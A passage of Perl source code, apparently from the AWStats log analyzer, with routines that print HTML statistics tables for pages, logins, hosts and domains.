\"ShowPagesAddField_$pluginname\";\n\t\t&$function('title');\n\t}\n\tprint \"<th>&nbsp;</th></tr>\\n\";\n\t$total_p = $total_k = $total_e = $total_x = 0;\n\tmy $count = 0;\n\tif ( $HTMLOutput{'urlentry'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \\%_url_e,\n\t\t\t\\%_url_e );\n\t}\n\telsif ( $HTMLOutput{'urlexit'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \\%_url_x,\n\t\t\t\\%_url_x );\n\t}\n\telse {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'File'}, \\%_url_p,\n\t\t\t\\%_url_p );\n\t}\n\tmy $max_p = 1;\n\tmy $max_k = 1;\n\tforeach my $key (@keylist) {\n\t\tif ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }\n\t\tif ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {\n\t\t\t$max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );\n\t\t}\n\t}\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($key);\n\t\tprint \"</td>\";\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_e = 0;\n\t\tmy $bredde_x = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_e =\n\t\t\t  int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_x =\n\t\t\t  int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k =\n\t\t\t  int( $BarWidth *\n\t\t\t\t  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /\n\t\t\t\t  $max_k ) + 1;\n\t\t}\n\t\tif ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }\n\t\tif ( $ShowPagesStats =~ /P/i ) {\n\t\t\tprint \"<td>\".Format_Number($_url_p{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_url_k{$key}\n\t\t\t\t? Format_Bytes(\n\t\t\t\t\t$_url_k{$key} / ( $_url_p{$key} || 1 )\n\t\t\t\t  )\n\t\t\t\t: \"&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\n\t\t# Call to plugins' function ShowPagesAddField\n\t\tforeach my $pluginname (\n\t\t\tkeys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t\t{\n\n\t\t  #    \t\t\t\tmy $function=\"ShowPagesAddField_$pluginname('$key')\";\n\t\t  #    \t\t\t\teval(\"$function\");\n\t\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t\t&$function($key);\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t# alt and title are not provided to reduce page size\n\t\tif ( $ShowPagesStats =~ /P/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"4\\\" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hk'}\\\" width=\\\"$bredde_k\\\" height=\\\"4\\\" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'he'}\\\" width=\\\"$bredde_e\\\" height=\\\"4\\\" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hx'}\\\" width=\\\"$bredde_x\\\" height=\\\"4\\\" />\";\n\t\t}\n\t\tprint \"</td></tr>\\n\";\n\t\t$total_p += $_url_p{$key};\n\t\t$total_e += $_url_e{$key};\n\t\t$total_x += $_url_x{$key};\n\t\t$total_k += $_url_k{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPages / $total_p - $TotalEntries / $total_e - $TotalExits / $total_x - $TotalBytesPages / $total_k\",\n\t\t\t2\n\t\t);\n\t}\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_k = $TotalBytesPages - $total_k;\n\tmy $rest_e = $TotalEntries - $total_e;\n\tmy $rest_x = $TotalExits - $total_x;\n\tif ( $rest_p > 0 || $rest_e > 0 || $rest_k > 0 ) {\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowPagesStats =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$rest_k\n\t\t\t\t? Format_Bytes( $rest_k / ( $rest_p || 1 ) )\n\t\t\t\t: \"&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint \"<td>\" . ( $rest_e ? Format_Number($rest_e) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint \"<td>\" . ( $rest_x ? Format_Number($rest_x) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\n\t\t# Call to plugins' function ShowPagesAddField\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t\t{\n\t\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t\t&$function('');\n\t\t}\n\t\tprint \"<td>&nbsp;</td></tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Login details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowLogins{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tprint \"$Center<a name=\\\"logins\\\">&nbsp;</a><br />\\n\";\n\tmy $title = '';\n\tif ( $HTMLOutput{'alllogins'} )  { $title .= \"$Message[94]\"; }\n\tif ( $HTMLOutput{'lastlogins'} ) { $title .= \"$Message[9]\"; }\n\t&tab_head( \"$title\", 19, 0, 'logins' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[94] : \"\n\t  . Format_Number(( scalar keys %_login_h )) . \"</th>\";\n\t&HTMLShowUserInfo('__title__');\n\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\t$total_p = $total_h = $total_k = 0;\n\tmy $count = 0;\n\tif ( $HTMLOutput{'alllogins'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},\n\t\t\t\\%_login_h, \\%_login_p );\n\t}\n\tif ( $HTMLOutput{'lastlogins'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Login'},\n\t\t\t\\%_login_h, \\%_login_l );\n\t}\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">$key</td>\";\n\t\t&HTMLShowUserInfo($key);\n\t\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_login_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_login_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_login_l{$key}\n\t\t\t\t? Format_Date( $_login_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_login_p{$key} || 0;\n\t\t$total_h += $_login_h{$key};\n\t\t$total_k += $_login_k{$key} || 0;\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalPages - $total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other logins and/or anonymous\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[125]</span></td>\";\n\t\t&HTMLShowUserInfo('');\n\t\tif ( $ShowAuthenticatedUsers =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowAuthenticatedUsers =~ /L/i ) {\n\t\t\tprint \"<td>&nbsp;</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Unknown IP/Host details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowHostsUnknown{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tprint \"$Center<a name=\\\"unknownip\\\">&nbsp;</a><br />\\n\";\n\t&tab_head( \"$Message[45]\", 19, 0, 'unknownwip' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\"\n\t  . Format_Number(( scalar keys %_host_h ))\n\t  . \" $Message[1]</th>\";\n\t&HTMLShowHostInfo('__title__');\n\tif ( $ShowHostsStats =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\t$total_p = $total_h = $total_k = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \\%_host_h,\n\t\t\\%_host_p );\n\tforeach my $key (@keylist) {\n\t\tmy $host = CleanXSS($key);\n\t\tprint \"<tr><td class=\\\"aws\\\">$host</td>\";\n\t\t&HTMLShowHostInfo($key);\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_host_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_host_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_host_l{$key}\n\t\t\t\t? Format_Date( $_host_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_host_p{$key};\n\t\t$total_h += $_host_h{$key};\n\t\t$total_k += $_host_k{$key} || 0;\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalPages - $total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other visitors (known or not)\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[82]</span></td>\";\n\t\t&HTMLShowHostInfo('');\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) { print \"<td>\".Format_Number($rest_h).\"</td>\"; }\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Host details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowHosts{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tprint \"$Center<a name=\\\"hosts\\\">&nbsp;</a><br />\\n\";\n\n\t# Show filter form\n\t&HTMLShowFormFilter( \"hostfilter\", $FilterIn{'host'},\n\t\t$FilterEx{'host'} );\n\n\t# Show hosts list\n\tmy $title = '';\n\tmy $cpt   = 0;\n\tif ( $HTMLOutput{'allhosts'} ) {\n\t\t$title .= \"$Message[81]\";\n\t\t$cpt = ( scalar keys %_host_h );\n\t}\n\tif ( $HTMLOutput{'lasthosts'} ) {\n\t\t$title .= \"$Message[9]\";\n\t\t$cpt = ( scalar keys %_host_h );\n\t}\n\t&tab_head( \"$title\", 19, 0, 'hosts' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\";\n\tif ( $FilterIn{'host'} || $FilterEx{'host'} ) {    # With filter\n\t\tif ( $FilterIn{'host'} ) {\n\t\t\tprint \"$Message[79] '<b>$FilterIn{'host'}</b>'\";\n\t\t}\n\t\tif ( $FilterIn{'host'} && $FilterEx{'host'} ) { print \" - \"; }\n\t\tif ( $FilterEx{'host'} ) {\n\t\t\tprint \" Exclude $Message[79] '<b>$FilterEx{'host'}</b>'\";\n\t\t}\n\t\tif ( $FilterIn{'host'} || $FilterEx{'host'} ) { print \": \"; }\n\t\tprint \"$cpt $Message[81]\";\n\t\tif ( $MonthRequired ne 'all' ) {\n\t\t\tif ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {\n\t\t\t\tprint\n\"<br />$Message[102]: \".Format_Number($TotalHostsKnown).\" $Message[82], \".Format_Number($TotalHostsUnknown).\" $Message[1] - \".Format_Number($TotalUnique).\" $Message[11]\";\n\t\t\t}\n\t\t}\n\t}\n\telse {    # Without filter\n\t\tif ( $MonthRequired ne 'all' ) {\n\t\t\tprint\n\"$Message[102] : \".Format_Number($TotalHostsKnown).\" $Message[82], \".Format_Number($TotalHostsUnknown).\" $Message[1] - \".Format_Number($TotalUnique).\" $Message[11]\";\n\t\t}\n\t\telse { print \"$Message[102] : \" . Format_Number(( scalar keys %_host_h )); }\n\t}\n\tprint \"</th>\";\n\t&HTMLShowHostInfo('__title__');\n\tif ( $ShowHostsStats =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tif ( $ShowHostsStats =~ /L/i ) {\n\t\tprint \"<th width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\t$total_p = $total_h = $total_k = 0;\n\tmy $count = 0;\n\tif ( $HTMLOutput{'allhosts'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \\%_host_h,\n\t\t\t\\%_host_p );\n\t}\n\tif ( $HTMLOutput{'lasthosts'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Host'}, \\%_host_h,\n\t\t\t\\%_host_l );\n\t}\n\tmy $regipv4=qr/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/;\n\n\tif ( $DynamicDNSLookup == 2 ) {\n\t\t# Use static DNS file\n\t\t&Read_DNS_Cache( \\%MyDNSTable, \"$DNSStaticCacheFile\", \"\", 1 );\n\t}\n\n\tforeach my $key (@keylist) {\n\t\tmy $host = CleanXSS($key);\n\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t  . ( $_robot_l{$key} ? '<b>'  : '' ) . \"$host\"\n\t\t  . ( $_robot_l{$key} ? '</b>' : '' );\n\n\t\tif ($DynamicDNSLookup) {\n\t\t\t# Dynamic reverse DNS lookup\n        \t        if ($host =~ /$regipv4/o) {\n                \t        my $lookupresult=lc(gethostbyaddr(pack(\"C4\",split(/\\./,$host)),AF_INET));       # This may be slow\n                        \tif (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {\n\t\t\t\t\tif ( $DynamicDNSLookup == 2 ) {\n\t\t\t\t\t\t# Check static DNS file\n\t\t\t\t\t\t$lookupresult = $MyDNSTable{$host};\n\t\t\t\t\t\tif ($lookupresult) { print \" ($lookupresult)\"; }\n\t\t\t\t\t\telse { print \"\"; }\n\t\t\t\t\t}\n\t\t\t\t\telse { print \"\"; }\n\t                        }\n        \t                else { print \" ($lookupresult)\"; }\n\t                }\n\t\t}\n\n\t\tprint \"</td>\";\n\t\t&HTMLShowHostInfo($key);\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_host_p{$key} ? Format_Number($_host_p{$key}) : \"&nbsp;\" )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_host_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_host_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_host_l{$key}\n\t\t\t\t? Format_Date( $_host_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_host_p{$key};\n\t\t$total_h += $_host_h{$key};\n\t\t$total_k += $_host_k{$key} || 0;\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalPages - $total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{    # All other visitors (known or not)\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\t&HTMLShowHostInfo('');\n\t\tif ( $ShowHostsStats =~ /P/i ) {\n\t\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /H/i ) { print \"<td>\".Format_Number($rest_h).\"</td>\"; }\n\t\tif ( $ShowHostsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowHostsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Domains details frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowDomains{\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $total_k = 0;\n\tmy $total_v = 0;\n\tmy $total_u = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $rest_k = 0;\n\tmy $rest_v = 0;\n\tmy $rest_u = 0;\n\tprint \"$Center<a name=\\\"domains\\\">&nbsp;</a><br />\\n\";\n\n\t# Show domains list\n\tmy $title = '';\n\tmy $cpt   = 0;\n\tif ( $HTMLOutput{'alldomains'} ) {\n\t\t$title .= \"$Message[25]\";\n\t\t$cpt = ( scalar keys %_domener_h );\n\t}\n\t&tab_head( \"$title\", 19, 0, 'domains' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"$WIDTHCOLICON\\\">&nbsp;</th><th colspan=\\\"2\\\">$Message[17]</th>\";\n\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_u\\\" width=\\\"80\\\">$Message[11]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_v\\\" width=\\\"80\\\">$Message[10]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th>\";\n\t}\n\tprint \"<th>&nbsp;</th>\";\n\tprint \"</tr>\\n\";\n\t$total_u = $total_v = $total_p = $total_h = $total_k = 0;\n\tmy $max_h = 1;\n\tforeach ( values %_domener_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\tmy $max_k = 1;\n\tforeach ( values %_domener_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_domener_h,\n\t\t\\%_domener_p );\n\tforeach my $key (@keylist) {\n\t\tmy ( $_domener_u, $_domener_v );\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;\n\t\t}    # use max_h to enable to compare pages with hits\n\t\tif ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h =\n\t\t\t  int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k =\n\t\t\t  int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +\n\t\t\t  1;\n\t\t}\n\t\tif ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }\n\t\tmy $newkey = lc($key);\n\t\tif ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {\n\t\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\"><img src=\\\"$DirIcons\\/flags\\/ip.png\\\" height=\\\"14\\\"\"\n\t\t\t  . AltTitle(\"$Message[0]\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$Message[0]</td><td>$newkey</td>\";\n\t\t}\n\t\telse {\n\t\t\tprint\n\"<tr><td width=\\\"$WIDTHCOLICON\\\"><img src=\\\"$DirIcons\\/flags\\/$newkey.png\\\" height=\\\"14\\\"\"\n\t\t\t  . AltTitle(\"$newkey\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$DomainsHashIDLib{$newkey}</td><td>$newkey</td>\";\n\t\t}\n\t\t## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE\n\t\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\t\t$_domener_u = (\n\t\t\t\t  $_domener_p{$key}\n\t\t\t\t? $_domener_p{$key} / $TotalPages\n\t\t\t\t: 0\n\t\t\t);\n\t\t\t$_domener_u += ( $_domener_h{$key} / $TotalHits );\n\t\t\t$_domener_u =\n\t\t\t  sprintf( \"%.0f\", ( $_domener_u * $TotalUnique ) / 2 );\n\t\t\tprint \"<td>\".Format_Number($_domener_u).\" (\"\n\t\t\t  . sprintf( \"%.1f%\", 100 * $_domener_u / $TotalUnique )\n\t\t\t  . \")</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\t\t$_domener_v = (\n\t\t\t\t  $_domener_p{$key}\n\t\t\t\t? $_domener_p{$key} / $TotalPages\n\t\t\t\t: 0\n\t\t\t);\n\t\t\t$_domener_v += ( $_domener_h{$key} / $TotalHits );\n\t\t\t$_domener_v =\n\t\t\t  sprintf( \"%.0f\", ( $_domener_v * $TotalVisits ) / 2 );\n\t\t\tprint \"<td>\".Format_Number($_domener_v).\" (\"\n\t\t\t  . sprintf( \"%.1f%\", 100 * $_domener_v / $TotalVisits )\n\t\t\t  . \")</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\t\tprint \"<td>\".Format_Number($_domener_p{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_domener_h{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_domener_k{$key} ) . \"</td>\";\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\t\tif ( $ShowDomainsStats =~ /P/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\"\"\n\t\t\t  . AltTitle( \"$Message[56]: \" . int( 